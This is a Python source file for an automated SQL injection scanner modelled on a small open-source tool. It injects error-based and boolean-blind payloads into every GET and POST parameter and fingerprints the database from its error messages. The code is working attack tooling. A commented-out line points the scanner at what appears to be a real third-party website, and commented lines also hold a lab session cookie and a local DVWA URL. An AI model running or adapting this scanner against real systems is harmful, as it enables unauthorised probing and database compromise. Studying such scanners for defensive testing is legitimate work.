import re
import os
from bs4 import BeautifulSoup
# import requests
import Request
import difflib
import urllib.request as urequest
import random
import itertools
import traceback
import optparse
import sys
import time

# headers = {'User-Agent':"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1"}
# cookies = "security=low&csrftoken=eEJxHll7Sc4mNSVJLafLcFUaSJppYtJTRMHmEqGClgd1F2eunj7auFaTBHGNszWu&PHPSESSID=6uvsui0op4v2rf4rc3pbvn6sa1"
# cookies = _splitdata(cookies)
# print(cookies)

class scan_sqlinj(object):
    def __init__(self,url='',data='',cookies=''):
        self.url = url if url else ''
        self.data = data if data else ''
        self.aa = ''

        self.cookies= cookies
        self.requests = Request.download()
        # self.lock = lock

        self.PREFIXES = (" ", ") ", "' ", "') ", "\" ", "\") ")
        self.SUFFIXES = ("", "-- -", "#", "/*")
        self.TAMPER_SQL_CHAR_POOL = ('(', ')', '\'', '"')
        self.BOOLEAN_TESTS = ("AND %d=%d", "OR NOT (%d>%d)")
        self.HTTPCODE,self.TITLE,self.TEXT = range(3)
        self.FUZZY_THRESHOLD = 0.95
        self.RANDINT = random.randint(1, 255)
        self.DBMS_ERRORS = {
            "MySQL": (r"SQL.*syntax", r"Warning.*mysql_.*", r"valid.*MySQL.*result", r"MySqlClient\."),
            "PostgreSQL": (r"PostgreSQL.*ERROR", r"Warning.*\Wpg_.*", r"valid.*PostgreSQL.*result", r"Npgsql\."),
            "Microsoft SQL Server": (r"Driver.*SQL[\-\_\ ]*Server", r"OLE DB.* SQL Server", r"(\W|\A)SQL Server.*Driver", r"Warning.*mssql_.*", r"(\W|\A)SQL Server.*[0-9a-fA-F]{8}", r"(?s)Exception.*\WSystem\.Data\.SqlClient\.", r"(?s)Exception.*\WRoadhouse\.Cms\."),
            "Microsoft Access": (r"Microsoft.*Access.*Driver",r"JET.*Database.*Engine", r"Access.*Database.*Engine"),
            "Oracle": (r"\bORA-[0-9][0-9][0-9][0-9]", r"Oracle.*error", r"Oracle.*Driver", r"Warning.*\Woci_.*", r"Warning.*\Wora_.*"),
            "IBM DB2": (r"CLI.*Driver.*DB2", r"DB2.*SQL.*error", r"\bdb2_\w+\("),
            "SQLite": (r"SQLite/JDBCDriver", r"SQLite.Exception", r"System.Data.SQLite.SQLiteException", r"Warning.*sqlite_.*", r"Warning.*SQLite3::", r"\[SQLITE_ERROR\]"),
            "Sybase": (r"(?i)Warning.*sybase.*", r"Sybase.*message", r"Sybase.*Server.*message.*"),
        }
        #处理data
        D = ''
        try:
            if self.data:
                for i, j in self.data.items():
                    D += '%s%s%s%s' % (i, '=', j, '&')
                D = D.rstrip('&')
        except:
            pass
        finally:
            self.data = D

    def _splitdata(self,data):
        ret = {}
        data = data.split('&')
        # print(data)
        try:
            for i in range(len(data)):
                part = data[i].split('=')
                ret[part[0]] = str(part[1])
        except Exception as e:
            print('split error')
        # print(ret)
        finally:
            return ret


    def _retrieve_content(self,url='',data = "",method = "GET"):
        retval  = {}
        try:
            if method is "GET":
                # req = self.requests.get(url,headers=headers,timeout = 5,cookies=self.cookies)
                req = self.requests.get(url,timeout = 5,cookies=self.cookies)
                # print(req.text)
                retval[self.TEXT] = re.sub(r"(?s)<script.+?</script>|<style.+?</style>|<!--.+?-->|\s+|<[^>]+?>",'',req.text)
                retval[self.HTTPCODE] = req.status_code
                Soup = BeautifulSoup(req.text,'lxml')
                retval[self.TITLE] = Soup.find('title').get_text() if Soup.find('title') else ""
                return retval
            else:
                if data: data = self._splitdata(data)
                # req = self.requests.post(url,headers=headers,data=data,timeout = 5,cookies=self.cookies)
                req = self.requests.post(url,data=self.data,timeout = 5,cookies=self.cookies)
                retval[self.TEXT] = re.sub(r'(?s)<script.+?</script>|<style.+?</style>|<!--.+?-->|\s+|<[^>]+?>', '', req.text)
                retval[self.HTTPCODE] = req.status_code
                Soup = BeautifulSoup(req.text, 'lxml')
                retval[self.TITLE] = Soup.find('title').get_text() if Soup.find('title') else ""
                return retval
        except Exception as e:
            # print('request error:',str(e))
            retval[self.TEXT]=''
            retval[self.HTTPCODE] = 0
            retval[self.TITLE]=''
            return retval


    def _scan_page(self):
        retval = False
        try:
            for phas in ("GET","POST"):
                GDurl = ('%s&%s'%(self.url,self.data) if self.url.find('?') >-1 else '%s?%s'%(self.url,self.data)) if self.data and phas is "GET" else self.url
                current = self.data if self.data and phas is "POST" else GDurl
                for match in re.finditer(r'((\A|[?&])(?P<parameter>[\w\[\]]+)=)(?P<value>[^&#]+)',current):
                    # print(match.group(0),'| ',match.group('parameter'),'| ',match.group(1))
                    print('scaning parameter: %s  ,method: %s'%(match.group('parameter'),phas))
                    vulnerable = False
                    original = self._retrieve_content(current) if phas is "GET" else (self._retrieve_content(self.url,current,"POST") if self.data else self._retrieve_content(self.url,"","POST"))
                    errpayload = ''.join(random.sample(self.TAMPER_SQL_CHAR_POOL,len(self.TAMPER_SQL_CHAR_POOL)))
                    # attack = current.replace(match.group(0),urequest.quote('%s%s'%(match.group(0),errpayload)))
                    attack = current.replace(match.group(0),'%s%s'%(match.group(0),errpayload))
                    print("[$]",attack)
                    content = self._retrieve_content(attack) if phas is "GET" else (self._retrieve_content(self.url,attack,"POST") if self.data else self._retrieve_content(self.url,'',"POST"))
                    for dbms,regex in [(db,err) for db in self.DBMS_ERRORS for err in self.DBMS_ERRORS[db]]:
                        # print(dbms,'[*]',regex)
                        if not vulnerable and re.search(regex,content[self.TEXT],re.S):
                            print('%s parameter:%s  may be errorSQLi vulnerable (and the database species is %s,the paload is %s)'%(phas,match.group('parameter'),dbms,errpayload))
                            # self.lock.acquire()
                            with open('d:\\scan_results.txt', 'a') as fd:
                                fd.write('%s parameter:%s  may be errorSQLi vulnerable (and the database species is %s) in url %s  %s'%(phas,match.group('parameter'),dbms,self.url,time.ctime()) + '\n')
                            retval = vulnerable = True
                            # self.lock.release()
                            return True
                    vulnerable = False

                    for prefix,boolean,suffix,inline_comment in itertools.product(self.PREFIXES,self.BOOLEAN_TESTS,self.SUFFIXES,(False,True)): #False True express 逻辑判断right/no
                        if not vulnerable:
                            gather = ('%s%s%s'%(prefix,boolean,suffix)).replace(' ','/**/')
                            # print(gather)
                            # attack2 = dict((_,current.replace(match.group(0),urequest.quote('%s%s'%(match.group(0),gather%(self.RANDINT if _ else self.RANDINT+1,self.RANDINT)),safe='%'))) for _ in (True,False))
                            attack2 = dict((_,current.replace(match.group(0),'%s%s'%(match.group(0),gather%(self.RANDINT if _ else self.RANDINT+1,self.RANDINT)))) for _ in (True,False))
                            content = dict((_,self._retrieve_content(attack2[_],self.data) if phas is "GET" else self._retrieve_content(self.url,attack2[_])) for _ in (True,False))
                            if all(_[self.HTTPCODE]!=0 for _ in (original,content[True],content[False])):
                                if any(original[_] == content[True][_] != content[False][_] for _ in (self.HTTPCODE,self.TITLE)):
                                    vulnerable = True
                                else:
                                    ratios = dict((_,difflib.SequenceMatcher(None,original[self.TEXT],content[_][self.TEXT]).ratio()) for _ in (True,False))
                                    vulnerable = all(ratios.values()) and min(ratios.values()) < self.FUZZY_THRESHOLD < max(ratios.values()) and abs(ratios[True]-ratios[False]) > self.FUZZY_THRESHOLD / 10
                            if vulnerable:
                                print('%s parameter:%s may be blindSQLi vulnerable (and payloadstyle:%s)'%(phas,match.group('parameter'),gather))
                                # self.lock.acquire()
                                with open('d:\\scan_results.txt', 'a') as fd:
                                    fd.write('%s parameter:%s may be blindSQLi vulnerable in url %s  %s'%(phas,match.group('parameter'),self.url,time.ctime()) + '\n')
                                # self.lock.release()
                                return True
        except Exception as e:
            # print(e)
            # print(traceback.print_exc())
            print('sqlinject_scanpage_error:',str(e))
        return retval
# data = ''
# url = 'http://localhost:8088/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit'


# sd = scan_sqlinj('http://www.hbxffy.com/info/dispnews.asp?id=2073')
# sd._scan_page()


'''

if __name__ == '__main__':
    parse = optparse.OptionParser()
    parse.add_option('-u',dest="url",help='Target URL(eg:http://127.0.0.1/dwva/vulnerabilities/sqli/?id=1)')
    parse.add_option('-c','--cookie',dest='cookies',help='HTTP Cookie header')
    parse.add_option('-d',dest='data',help='POST Data')
    parse.add_option('-p',dest='proxies',help='HTTP Proxy')
    option, args = parse.parse_args(sys.argv[1:])
    cookies = option.cookies
    # cookies ={}
    # d = option.cookies
    # if d:
    #     s_cookies = d.split(';')
    #     try:
    #         for i in range(len(s_cookies)):
    #             part = s_cookies[i].split('=')
    #             cookies[part[0]] = str(part[1])
    #     except Exception as e:
    #         print('cookies error')
    #     print(cookies)
    url = option.url if option.url else ''
    data = option.data if option.data else ""
    proxy = option.proxies if option.proxies else ''
    proxies= {'HTTP':proxy}
    S = scan_sqlinj(url,data,cookies)
    print(S._scan_page())
'''

